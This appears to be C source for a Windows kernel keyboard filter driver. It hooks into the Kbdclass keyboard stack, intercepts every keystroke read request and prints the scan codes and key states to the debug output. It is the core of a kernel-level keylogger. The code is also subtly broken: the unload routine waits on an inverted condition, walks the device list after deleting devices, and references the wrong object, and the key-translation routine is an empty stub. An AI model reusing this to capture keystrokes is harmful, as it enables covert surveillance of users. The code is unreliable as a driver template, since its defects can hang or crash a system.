#include<ntddk.h>
#include<ntddkbd.h>
#include<ntstrsafe.h>
extern POBJECT_TYPE *IoDriverObjectType;
#define KBD_DRIVER_NAME L"\\Driver\\Kbdclass"
#define S_SHIFT 1
#define S_CAPS 2
#define S_NUM 4
LONG gC2pkeyCount=0;
typedef struct _C2P_DEV_EXT
{
	ULONG NodeSize;
	PDEVICE_OBJECT pFilterDeviceObject;
	KSPIN_LOCK IoRequestsSpinLock;
	KEVENT IoInProgressEvent;
	PDEVICE_OBJECT TargetDeviceObject;
	PDEVICE_OBJECT LowerDeviceObject;
}C2P_DEV_EXT, *PC2P_DEV_EXT;
NTSTATUS zlzattachdevice(PDRIVER_OBJECT driver, PUNICODE_STRING regpath);
NTSTATUS c2pDispatchGeneral(PDEVICE_OBJECT device, PIRP irp);
NTSTATUS c2pDispatchRead(PDEVICE_OBJECT device, PIRP irp);
NTSTATUS c2pDispatchPower(PDEVICE_OBJECT device, PIRP irp);
NTSTATUS c2pDispatchPnP(PDEVICE_OBJECT device, PIRP irp);
NTSTATUS c2pUnload(PDRIVER_OBJECT driver);
NTSTATUS c2pReadComplete(PDEVICE_OBJECT device, PIRP irp, PVOID context);
NTSTATUS c2DevExtInit(PC2P_DEV_EXT devExt, PDEVICE_OBJECT pFilterDeviceObject, PDEVICE_OBJECT pTargetDeviceObject, PDEVICE_OBJECT LowerDeviceObject);
NTSTATUS ObReferenceObjectByName(PUNICODE_STRING Object,ULONG attr,PACCESS_STATE access,ACCESS_MASK desacc,POBJECT_TYPE opjtype,KPROCESSOR_MODE accmod,PVOID par,PVOID *obj);
NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING str)
{
	UNREFERENCED_PARAMETER(driver);
	UNREFERENCED_PARAMETER(str);
	NTSTATUS status;
	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		driver->MajorFunction[i] = c2pDispatchGeneral;
	}
	driver->MajorFunction[IRP_MJ_READ] = c2pDispatchRead;
	driver->MajorFunction[IRP_MJ_POWER] = c2pDispatchPower;
	driver->MajorFunction[IRP_MJ_PNP] = c2pDispatchPnP;
	driver->DriverUnload = c2pUnload;
	status = zlzattachdevice(driver, str);
	return STATUS_SUCCESS;
}
NTSTATUS zlzattachdevice(PDRIVER_OBJECT driver, PUNICODE_STRING regpath)
{
	UNREFERENCED_PARAMETER(driver);
	UNREFERENCED_PARAMETER(regpath);
	NTSTATUS status = 0;
	PC2P_DEV_EXT devExt;
	UNICODE_STRING uniNtNameString;
	PDEVICE_OBJECT pFilterDeviceObject = NULL;
	PDEVICE_OBJECT pTargetDeviceObject = NULL;
	PDEVICE_OBJECT pLowerDeviceObject = NULL;
	PDRIVER_OBJECT KbdDriverObject = NULL;
	RtlInitUnicodeString(&uniNtNameString, KBD_DRIVER_NAME);
	status = ObReferenceObjectByName(&uniNtNameString, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, &KbdDriverObject);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("error1\n"));
		DbgPrint("0x%x", status);
		return status;
	}
	else
	{
		ObReferenceObject(driver);
	}
	pTargetDeviceObject = KbdDriverObject->DeviceObject;
	while (pTargetDeviceObject)
	{
		status = IoCreateDevice(driver, sizeof(C2P_DEV_EXT), NULL, pTargetDeviceObject->DeviceType, pTargetDeviceObject->Characteristics, FALSE, &pFilterDeviceObject);
		if (!NT_SUCCESS(status))
		{
			KdPrint(("error2"));
			return status;
		}
		pLowerDeviceObject = IoAttachDeviceToDeviceStack(pFilterDeviceObject, pTargetDeviceObject);
		if (!pLowerDeviceObject)
		{
			KdPrint(("error3"));
			IoDeleteDevice(pFilterDeviceObject);
			pFilterDeviceObject = NULL;
			return status;
		}
		devExt = (PC2P_DEV_EXT)(pFilterDeviceObject->DeviceExtension);
		c2DevExtInit(devExt, pFilterDeviceObject, pTargetDeviceObject, pLowerDeviceObject);
		pFilterDeviceObject->DeviceType = pLowerDeviceObject->DeviceType;
		pFilterDeviceObject->Characteristics = pLowerDeviceObject->Characteristics;
		pFilterDeviceObject->StackSize = pLowerDeviceObject->StackSize + 1;
		pFilterDeviceObject->Flags |= pLowerDeviceObject->Flags&(DO_BUFFERED_IO | DO_DIRECT_IO | DO_POWER_PAGABLE);
		pTargetDeviceObject = pTargetDeviceObject->NextDevice;
	}
	return STATUS_SUCCESS;
}
NTSTATUS c2DevExtInit(PC2P_DEV_EXT devExt, PDEVICE_OBJECT pFilterDeviceObject,PDEVICE_OBJECT pTargetDeviceObject, PDEVICE_OBJECT LowerDeviceObject)
{
	memset(devExt, 0, sizeof(C2P_DEV_EXT));
	devExt->NodeSize = sizeof(C2P_DEV_EXT);
	devExt->LowerDeviceObject = LowerDeviceObject;
	devExt->pFilterDeviceObject = pFilterDeviceObject;
	devExt->TargetDeviceObject = pTargetDeviceObject;
	KeInitializeSpinLock(&(devExt->IoRequestsSpinLock));
	KeInitializeEvent(&(devExt->IoInProgressEvent), NotificationEvent, FALSE);
	return STATUS_SUCCESS;
}
NTSTATUS c2pDispatchGeneral(PDEVICE_OBJECT device, PIRP irp)
{
	UNREFERENCED_PARAMETER(device);
	UNREFERENCED_PARAMETER(irp);
	DbgPrint("other dispatch\n");
	IoSkipCurrentIrpStackLocation(irp);
	return IoCallDriver(((PC2P_DEV_EXT)(device->DeviceExtension))->LowerDeviceObject, irp);
}
NTSTATUS c2pDispatchRead(PDEVICE_OBJECT device, PIRP irp)
{
	UNREFERENCED_PARAMETER(device);
	UNREFERENCED_PARAMETER(irp);
	NTSTATUS status = STATUS_SUCCESS;
	PC2P_DEV_EXT devExt;
	PIO_STACK_LOCATION currentIrpStack;
	KEVENT waitEvent;
	KeInitializeEvent(&waitEvent, NotificationEvent, FALSE);
	if (irp->CurrentLocation == 1)
	{
		ULONG ReturnedInformation = 0;
		DbgPrint("DISP ENCO BOGUS CURRENT LOCATION\n");
		status = STATUS_INVALID_DEVICE_REQUEST;
		irp->IoStatus.Status = status;
		irp->IoStatus.Information = ReturnedInformation;
		IoCompleteRequest(irp, IO_NO_INCREMENT);
		return status;
	}
	gC2pkeyCount++;
	devExt = device->DeviceExtension;
	currentIrpStack = IoGetCurrentIrpStackLocation(irp);
	IoCopyCurrentIrpStackLocationToNext(irp);
	IoSetCompletionRoutine(irp, c2pReadComplete, device, TRUE, TRUE, TRUE);
	return IoCallDriver(devExt->LowerDeviceObject,irp);
}
NTSTATUS c2pDispatchPower(PDEVICE_OBJECT device, PIRP irp)
{
	UNREFERENCED_PARAMETER(device);
	UNREFERENCED_PARAMETER(irp);
	PC2P_DEV_EXT devExt;
	devExt = (PC2P_DEV_EXT)device->DeviceExtension;
	PoStartNextPowerIrp(irp);
	return PoCallDriver(devExt->LowerDeviceObject, irp);
}
NTSTATUS c2pDispatchPnP(PDEVICE_OBJECT device, PIRP irp)
{
	UNREFERENCED_PARAMETER(device);
	UNREFERENCED_PARAMETER(irp);
	PC2P_DEV_EXT devExt;
	PIO_STACK_LOCATION irpStack;
	NTSTATUS status = STATUS_SUCCESS;
	devExt = device->DeviceExtension;
	irpStack = IoGetCurrentIrpStackLocation(irp);
	switch (irpStack->MinorFunction)
	{
	case IRP_MN_REMOVE_DEVICE:
		DbgPrint("driver is on removing....\n");
		IoSkipCurrentIrpStackLocation(irp);
		IoCallDriver(devExt->LowerDeviceObject, irp);
		IoDetachDevice(devExt->LowerDeviceObject);
		IoDeleteDevice(device);
		status = STATUS_SUCCESS;
		break;
	default:
		IoSkipCurrentIrpStackLocation(irp);
		status = IoCallDriver(devExt->LowerDeviceObject, irp);
		break;
	}
	return STATUS_SUCCESS;
}
NTSTATUS c2pUnload(PDRIVER_OBJECT driver)
{
	UNREFERENCED_PARAMETER(driver);
	PDEVICE_OBJECT DeviceObject;
	/*PDEVICE_OBJECT OldDeviceObject;*/
	PC2P_DEV_EXT devExt;
	LARGE_INTEGER lDelay;
	PRKTHREAD CurrentThread;
	lDelay = RtlConvertLongToLargeInteger(1000 * -10);
	CurrentThread = KeGetCurrentThread();
	KeSetPriorityThread(CurrentThread, LOW_REALTIME_PRIORITY);
	DbgPrint("ready to unload\n");
	DeviceObject = driver->DeviceObject;
	while (DeviceObject)
	{
		devExt = DeviceObject->DeviceExtension;
		IoDetachDevice(devExt->TargetDeviceObject);
		IoDeleteDevice(DeviceObject);
		DeviceObject = DeviceObject->NextDevice;
	}
	while (!gC2pkeyCount)
	{
		KeDelayExecutionThread(KernelMode, FALSE, &lDelay);
	}
	DbgPrint("unload success\n");
	return STATUS_SUCCESS;
}
NTSTATUS c2pReadComplete(PDEVICE_OBJECT device, PIRP irp, PVOID context)
{
	UNREFERENCED_PARAMETER(irp);
	UNREFERENCED_PARAMETER(context);
	UNREFERENCED_PARAMETER(device);
	PIO_STACK_LOCATION irpsp;
	ULONG buf_len = 0;
	ULONG memsize;
	irpsp = IoGetCurrentIrpStackLocation(irp);
	if (NT_SUCCESS(irp->IoStatus.Status))
	{
		buf_len = (ULONG)irp->IoStatus.Information;
		PKEYBOARD_INPUT_DATA sa = irp->AssociatedIrp.SystemBuffer;
		DbgPrint("smm:0x%x\n", sa->MakeCode);
		DbgPrint("%s\n", sa->Flags ? "up" : "down");
		memsize = buf_len / sizeof(KEYBOARD_INPUT_DATA);
		DbgPrint("keynum:%d", memsize);
	}
	gC2pkeyCount--;
	if (irp->PendingReturned)
	{
		IoMarkIrpPending(irp);
	}
	return irp->IoStatus.Status;
}
void __stdcall print_keyscore(UCHAR sch)
{
	static int kb_status;
	if ((sch & 0x80) == 0)
	{
		if ((sch < 0x47) || ((sch >= 0x47) && sch < 0x54) && (kb_status&S_NUM))
		{
		}
	}
}